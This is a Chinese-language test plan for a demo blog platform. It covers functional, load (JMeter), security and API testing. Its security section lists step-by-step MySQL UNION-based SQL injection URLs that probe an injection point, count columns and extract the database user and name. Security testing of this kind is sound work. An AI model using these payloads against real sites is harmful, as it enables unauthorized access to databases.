# 测试计划
 ## 功能测试
 0. 注册模块
  ### a) 密码太长
  ### b）密码太简单。
  ### c) 密码包含特殊字符。
  ### d) 空密码不允许。
  ### 这可太多了。。。。

 1. 登录模块
  ### a) 输入正确的用户名和密码，正常登陆
  ### b) 输入错误的用户名和密码，登录错误
  ### c) 不输入用户名和密码直接按，登录错误
  ### d) 输入特殊密码 例如 带 单引号的，带双引号的，带表情的，根据相应规则，弹出相应提示。
  ### 如不允许，应弹出不允许提示。
  ### 如果允许，应弹出登录成功提示。
  ### e) 如未登录，无法发表文章。
  ### f) 登录完成，可以发表文章。

 2. 文章发表模块
  ### a) 文字写入模块。
  ### 写入正常文字
  ### 写入火星文和表情
  ### 写入特殊字符。单引号，双引号。正常写入
  ### 写入超长文字，提示无法输入超长。
  ### 写入部分文字以后，再点“写文章”按钮，提示是否想要清除当前写入。 点击“清除”，成功清除，点击“取消”，可以接着编辑。[进一步奇思妙想当然可以 有草稿箱 之类的功能，我这里不扩展了]
  ### 写入完成之后，点击"发布"按钮， 弹出提示，“确认发布吗？”， “返回修改？”。点击“确认发布”后发布成功，点击“返回修改”后可以 继续返回修改。
  ### b)图片上传按钮测试。
  ### 可以上传，可以拖拽。两个基本功能。 这里不用搞的太复杂了
  ### 有一个点需要特别关注，对于上传超大尺寸图片怎么处理。
  ### 如果不允许超大尺寸，需要弹出提示，我们最大允许多大尺寸。
  ### 如果允许超大尺寸，必须验证大图能成功上传。
  ### 是否支持上传小视频，小视频尺寸多大？ 等等。
  ### 超过视频大小需要弹框建议，传不了。
  ### 小于最大尺寸的小视频应该能够上传。

3. 文章列表模块。
  ### a) 新发布的文章在最上显示。后发布的文章在下面显示。
  ### b) 这应该是一个博客园项目。是否支持全局搜索。验证根据关键字进行全局搜索是否能显示出相关文章。
  ### c) 文章中图片/小视频是否能正常显示。
  ### d) 图片是否能放大显示。
  ### e) 小视频是否能全屏播放
  ### f) 文章数过多时是否支持分页。

 ## 性能测试
  
  ### 登录模块/ 注册模块
  [注册模块的性能测试与登录略为相似，这里省略]
  
  造数据。造大约10000用户的数据。此时有两种情况。
  可以使用测试服务器进行压测，也可以使用生产服务器进行压测。
  主要看测试服务器和生产服务器集群的规模是否一致。
  如果一致，建议测试服务器。
  如果非要到生产环境压测，请使用标记数据做好数据隔离。另外要做好生产环境挂了，随时回滚的准备。

  多台节点使用Jmeter实行并发压测。例如4台，保证每台节点的网络带宽满足测试需求。
  模拟 10人/100人/1000人/10000人同时登录博客系统。
  具体同时登陆人数以业务侧 PM给出的数据为准。

  ### 文章发表模块
  文章发表模块可以模拟多人同时发表文章。
  多台节点使用Jmeter实行并发压测。例如4台，保证每台节点的网络带宽满足测试需求。
  模拟 1000人同时发1000篇文章。
  模拟10000人同时发10000篇文章。
  具体同时发文章的数量以业务侧 PM给出的数据为准。
  [文章中需同时包含 图片/文字/小视频 信息。]
  
  具体同时发表文章数以业务侧 PM给出的数据为准。
  
  ### 文章列表模块
  这个接口模拟大量用户同时拉取文章列表。

  有两种可能性。 模拟用户拉取自己的文章列表。

  模拟用户用关键字做全局搜索拉取文章列表。

  例如每个用户发布了 1000篇文章。
  模拟1000人同时拉取1000篇文章。
  模拟10000人同时拉取1000篇文章。
  具体业务场景以PM指定的业务侧要求为准。
  如果做了分页，可以减少单次文章的拉取量。

 ### 总结
  上述性能测试模块需要着重关注 吞吐量，平均响应时间，错误率等参数。
  同时要关注服务器端服务的CPU, 内存，甚至数据库的IO等信息。
  不要将并发数设置的过大，具体根据业务侧的需求来。并发数放量到 1.5-2倍左右即可。

 ## 安全测试
   安全测试这个范围太大了，本文只讲一下SQL注入，不同的安全测试对应不同的工具和不同的测试方法。

   这个可以重点测试一下SQL注入。但是一般现代系统都已经规避了SQL注入。
   本例主要针对MYSQL 5.0做一些SQL注入的尝试，但是其他系统也是一样的，只是SQL语句略有不同。

   先输入博客园URL[这是个demo，不是真实的URL]。例如

   https://www.bokeyuan.com/article_list?user_id=101 and 1=1

   https://www.bokeyuan.com/article_list?user_id=101 and 1=2

   如果1=1返回正常，1=2返回不正常，则存在注入点。
   
   然后使用如下语句猜一下这个表有多少个字段[一个一个加，直到出现error为止。] 比如说这个表的字段是18个，加到19就会error
   
    https://www.bokeyuan.com/article_list?user_id=101 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from information_schema.tables
    
   找到错误之后，使用一个错误的user_id进行替换，例如-5,这时会返回一个空的1,2,3,4,5列表
   https://www.bokeyuan.com/article_list?user_id=-5 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from information_schema.tables
   
   下面就可以开黑了

   查询当前数据库user

    https://www.bokeyuan.com/article_list?user_id=-5 union select 1,user(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from information_schema.tables
    
   查询数据库，等等。不一一例举了。

    https://www.bokeyuan.com/article_list?user_id=-5 union select 1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from information_schema.tables


 ## API测试
   API 测试的Case可以参考功能测试的Case进行设计。但是要从API的角度出发，实现自动化。
   ### 框架可选取 pytest。 
   ### 请求部分可选用requests库。
   ### 断言部分可对python的原生assert做简单封装。